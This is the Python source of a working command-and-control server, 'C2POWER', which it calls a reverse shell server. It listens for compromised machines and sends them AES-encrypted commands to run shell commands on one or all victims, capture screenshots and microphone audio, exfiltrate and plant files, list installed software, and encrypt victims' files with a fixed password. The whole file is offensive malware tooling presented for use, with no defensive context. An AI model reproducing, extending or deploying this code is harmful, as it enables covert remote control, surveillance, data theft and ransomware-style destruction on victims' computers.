import socket,threading,base64,subprocess,readline,hashlib,asyncio,os
from datetime import datetime
from rich import print
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import getpass

class Encryption:
    static_key = hashlib.sha256(base64.b64decode("czMoZD9nPHVAcVQrPT5uWGR2XktZaDdXVncvYzdVfnJyfjQqSjZ4Xk5fa1NDZXA8c01oU0JURVJRWFUmYTh3OSFabUglLXRSP3U4akRBMiN6ZWJcalA1KTUoRkdQZjlCeWI=").decode('utf-8').encode()).digest()

    @staticmethod
    def encrypt_message(message):
        iv = os.urandom(16)
        cipher = AES.new(Encryption.static_key, AES.MODE_CBC, iv)
        encrypted = cipher.encrypt(pad(message.encode(), AES.block_size))
        return base64.b64encode(iv + encrypted).decode()

    @staticmethod
    def decrypt_message(encrypted_message):
        try:
            encrypted_data = base64.b64decode(encrypted_message)
            iv = encrypted_data[:16]
            encrypted = encrypted_data[16:]
            cipher = AES.new(Encryption.static_key, AES.MODE_CBC, iv)
            decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
            return decrypted.decode()
        except Exception as e:
            print(f"Decryption error: {str(e)}")
            return ""

class ReverseShellServer:
    def __init__(self):
        self.host = '0.0.0.0'
        self.port = 4444
        self.clients = {}
        self.current_client = None
        self.command_lock = threading.Lock()

    def welcome(self):
        banner = """
░█▀▀█ █▀█ ░█▀▀█ ░█▀▀▀█ ░█──░█ ░█▀▀▀ ░█▀▀█ 
░█─── ─▄▀ ░█▄▄█ ░█──░█ ░█░█░█ ░█▀▀▀ ░█▄▄▀ 
░█▄▄█ █▄▄ ░█─── ░█▄▄▄█ ░█▄▀▄█ ░█▄▄▄ ░█─░█
        """
        print(banner)
    def c2_help(self):
        self.menu = '''
help      : show help C2 Server Menu
list      : show connected clients
listup    : update connected clients list
shellall  : send shell command to all clients
shell     : select client for remote shell
getscreen : take screenshot from client
getvoice  : capture voice record with seconds
getfile   : download file from client to C2
getsoft   : get installed software list
putfile   : upload file from C2 to client
encrypt   : encrypt files and folders contents
back      : back to main menu
clear     : clean CLI workspace side C2 & SHELL
local     : execute command locally on the server
exit      : exit C2 server
'''
        print(self.menu)


    async def save_data(self, data_type, base64_content, client_info, filename=None):
        try:
            save_dir = os.path.join('clients', client_info.get('pc_name', 'unknown'))
            if not os.path.exists(save_dir):
                os.makedirs(save_dir)    
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            if not filename:
                filename = f"{data_type}_{timestamp}.{'png' if data_type == 'screenshot' else 'wav' if data_type == 'audio' else 'file'}"
            save_path = os.path.join(save_dir, filename)
            file_bytes = base64.b64decode(base64_content)
            with open(save_path, 'wb') as f:
                f.write(file_bytes)
            return f"Saved As: {save_path}"
        except Exception as e:
            return f"Error saving {data_type}: {str(e)}"


    async def send_file_to_client(self, client_socket, file_path, save_path):
        try:
            if not os.path.exists(file_path):
                return f"Error: File '{file_path}' does not exist."

            with open(file_path, 'rb') as f:
                file_bytes = f.read()
                base64_content = base64.b64encode(file_bytes).decode('utf-8')
                command = f"putfile {save_path} {base64_content}"
                encrypted_command = Encryption.encrypt_message(command)
                client_socket.send(encrypted_command.encode())
                response = await asyncio.get_event_loop().run_in_executor(None, client_socket.recv, 4096)
                decrypted_response = Encryption.decrypt_message(response.decode().strip())
                return decrypted_response
        except Exception as e:
            return f"Error sending file: {str(e)}"


    def list_clients(self):
        if not self.clients:
            print("No active connections")
            return
        for i, (client_id, client) in enumerate(self.clients.items(), 1):
            addr = client['addr']
            info = client.get('info', {})
            print(f"{i} [green]●[/green] {info.get('pc_name', 'unknown')}@{info.get('username', 'unknown')} ({addr[0]}:{addr[1]})")


    def update_clients(self):
        disconnected_clients = []
        for client_id, client in self.clients.items():
            try:
                encrypted_command = Encryption.encrypt_message("online")
                client['socket'].send(encrypted_command.encode())
                response = client['socket'].recv(4096).decode().strip()
                decrypted_response = Encryption.decrypt_message(response)
                if decrypted_response != "yes":
                    disconnected_clients.append(client_id)
            except:
                disconnected_clients.append(client_id)

        for client_id in disconnected_clients:
            del self.clients[client_id]


    async def handle_client(self, client_socket, addr):
        client_id = f"{addr[0]}:{addr[1]}"
        try:
            encrypted_cmd = Encryption.encrypt_message("whoami")
            client_socket.send(encrypted_cmd.encode())
            
            response = await asyncio.get_event_loop().run_in_executor(None, client_socket.recv, 4096)
            decrypted_response = Encryption.decrypt_message(response.decode().strip())
            pc_name, username = decrypted_response.split('\\', 1)
            client_info = {
                'info': {
                    'username': username,
                    'pc_name': pc_name
                },
                'socket': client_socket,
                'addr': addr
            }
            self.clients[client_id] = client_info
        except Exception as e:
            client_info = {
                'info': {
                    'username': 'unknown',
                    'pc_name': 'unknown'
                },
                'socket': client_socket,
                'addr': addr
            }
            self.clients[client_id] = client_info
        try:
            while True:
                if self.current_client and self.current_client['socket'] == client_socket:
                    with self.command_lock:
                        pc_name = self.current_client['info'].get('pc_name', 'unknown')
                        username = self.current_client['info'].get('username', 'unknown')
                        cmd = input(f"{pc_name}@{username}> ")
                        if not cmd:
                            continue
                        elif cmd.lower() == 'back':
                            self.current_client = None
                            continue
                        elif cmd.lower() == 'clear':
                            os.system('cls' if os.name == 'nt' else 'clear')
                            continue
                        elif cmd.lower() == 'getvoice':
                            print("getvoice [second]")
                            continue
                        elif cmd.startswith("getfile "):
                            filepath = cmd.split(" ", 1)[1]
                            cmd = f"getfile {filepath}"
                        elif cmd.startswith("putfile "):
                            parts = cmd.split(maxsplit=2)
                            if len(parts) < 3:
                                print("Usage: putfile <local_path> <remote_path>")
                                return
                            local_path = parts[1]
                            remote_path = parts[2]
                            response = await self.send_file_to_client(client_socket, local_path, remote_path)
                        elif cmd.lower().startswith("encrypt "):
                            target = cmd.split(" ", 1)[1]
                            password = "Password@super"
                            cmd = f"encrypt {target} {password}"
                        commands_crunch = ['ssh', 'telnet', 'cls', 'exit', 'wmic', 'set', 'diskpart', 'chkdsk', 'pause', 'powershell', 'cmd', 'netstat', 'net', 'netsh', 'sc', 'wevtutil', 'bitsadmin', 'comp', 'driverquery', 'gpresult', 'icacls', 'type', 'w32tm', 'waitfor', 'wevtutil', 'wmic']
                        if any(cmd.lower() == i or cmd.lower().startswith(f"{i} ") for i in commands_crunch):
                            print("[yellow]Interactive Command[/yellow]")
                            continue

                        # Encrypt the command before sending
                        encrypted_cmd = Encryption.encrypt_message(cmd)
                        client_socket.send(encrypted_cmd.encode())
                        
                        response = ""
                        while True:
                            chunk = await asyncio.get_event_loop().run_in_executor(None, client_socket.recv, 4096)
                            response += chunk.decode()
                            if response.endswith("\n"):
                                break
                        
                        decrypted_response = Encryption.decrypt_message(response.strip())
                        
                        if decrypted_response.startswith("GETFILE:"):
                            _, data = decrypted_response.split(":", 1)
                            filename, content = data.split("|", 1)
                            result = await self.save_data('file', content, self.current_client['info'], filename)
                            print(f"[green]{result}[/green]")

                        elif decrypted_response.startswith("AUDIO:"):
                            base64_data = decrypted_response.replace("AUDIO:", "")
                            result = await self.save_data('audio', base64_data, self.current_client['info'])
                            print(f"[green]{result}[/green]")
                        
                        elif decrypted_response.startswith("SCREENSHOT:"):
                            base64_data = decrypted_response.replace("SCREENSHOT:", "")
                            result = await self.save_data('screenshot', base64_data, self.current_client['info'])
                            print(f"[green]{result}[/green]")

                        elif decrypted_response:
                            print(f"[green]{decrypted_response}[/green]")
                else:
                    await asyncio.sleep(0.1)
                
        except Exception as e:
            print(f"\nClient error: {str(e)}")
        finally:
            client_socket.close()
            del self.clients[client_id]
            if self.current_client and self.current_client['socket'] == client_socket:
                self.current_client = None
            print(f"\nConnection closed: {addr}")


    async def send_command_to_all_clients(self, command):
        responses = {}
        if not command:
            print("[!] No command provided for shellall.")
            return responses

        for client_id, client in self.clients.items():
            client_socket = client['socket']
            pc_name = client['info'].get('pc_name', 'unknown')
            try:
                encrypted_cmd = Encryption.encrypt_message(command)
                client_socket.send(encrypted_cmd.encode())
                response = ""
                while True:
                    chunk = await asyncio.get_event_loop().run_in_executor(None, client_socket.recv, 4096)
                    response += chunk.decode()
                    if response.endswith("\n"):
                        break
                decrypted_response = Encryption.decrypt_message(response.strip())
                responses[pc_name] = decrypted_response
            except Exception as e:
                responses[pc_name] = f"Error: {str(e)}"
        return responses


    def execute_local_command(self, command):
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                print(f"[green]{result.stdout}[/green]")
            else:
                print(f"[red]{result.stderr}[/red]")
        except Exception as e:
            print(f"[red]Error executing local command: {str(e)}[/red]")

    async def server_command_loop(self):
        readline.parse_and_bind("tab: complete")
        readline.set_completer(self.completer)
        
        while True:
            if not self.current_client:
                with self.command_lock:
                    cmd = input("C2POWER😈 > ").strip()
                    if not cmd:
                        continue
                    if cmd.lower() == 'exit':
                        quit()
                    elif cmd.lower() == 'help':
                        self.c2_help()
                    elif cmd.lower() == 'list':
                        print()
                        self.list_clients()
                        print()
                    elif cmd.lower() == 'listup':
                        print()
                        self.update_clients()
                        self.list_clients()
                        print()
                    elif cmd.lower() == 'clear':
                        os.system('cls' if os.name == 'nt' else 'clear')
                        self.welcome()
                    elif cmd.lower().startswith('shellall'):
                        parts = cmd.split(maxsplit=1)
                        if len(parts) < 2:
                            print("[!] Usage: shellall <command>")
                            continue
                        print()
                        command_to_send = parts[1]
                        responses = await self.send_command_to_all_clients(command_to_send)
                        for pc_name, response in responses.items():
                            print(f"{pc_name}: [green]{response}[/green]")
                        print()
                    elif cmd.lower().startswith('shell '):
                        try:
                            session_id = int(cmd.split()[1])
                            if 1 <= session_id <= len(self.clients):
                                self.current_client = list(self.clients.values())[session_id - 1]
                            else:
                                print("\nInvalid session ID")
                        except (IndexError, ValueError):
                            print("\nInvalid command format. Type 'help' for help")
                    elif cmd.lower().startswith('local '):
                        local_command = cmd.split(maxsplit=1)[1]
                        self.execute_local_command(local_command)
                    elif cmd.lower() == 'exit':
                        break
                    else:
                        self.c2_help()
                        continue
            await asyncio.sleep(0.1)

    def completer(self, text, state):
        commands = ['help', 'list', 'listup','shell','shellall','getscreen','getvoice','getfile','getsoft','putfile','encrypt','back','clear','local']
        options = [cmd for cmd in commands if cmd.startswith(text)]
        if state < len(options):
            return options[state]
        return None

    async def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server.bind((self.host, self.port))
            server.listen(3)
            self.welcome()
            command_thread = threading.Thread(target=lambda: asyncio.run(self.server_command_loop()))
            command_thread.daemon = True
            command_thread.start()

            while True:
                client, addr = await asyncio.get_event_loop().run_in_executor(None, server.accept)
                client_handler = threading.Thread(
                    target=lambda: asyncio.run(self.handle_client(client, addr))
                )
                client_handler.daemon = True
                client_handler.start()
                
        except Exception as e:
            print(f"\nServer error: {e}")
        finally:
            server.close()

KEY = "90115c878c099e532d6d64ab0dd7c16dd55c7a78cccee0ecc044358095df9806"

def check_password():
    user_input = getpass.getpass('[+] Password : ')
    hashed_input = hashlib.sha256(user_input.encode()).hexdigest()
    if hashed_input != KEY:
        print('[!][red] INVALID PASSWORD [/red]')   
        return False
    return True

async def main():
    print("\n[+] WELCOME TO SERVER LOGIN 💀 ")
    
    if check_password():
        server = ReverseShellServer() 
        await server.start_server()
    else:
        quit()

if __name__ == "__main__":
    asyncio.run(main())
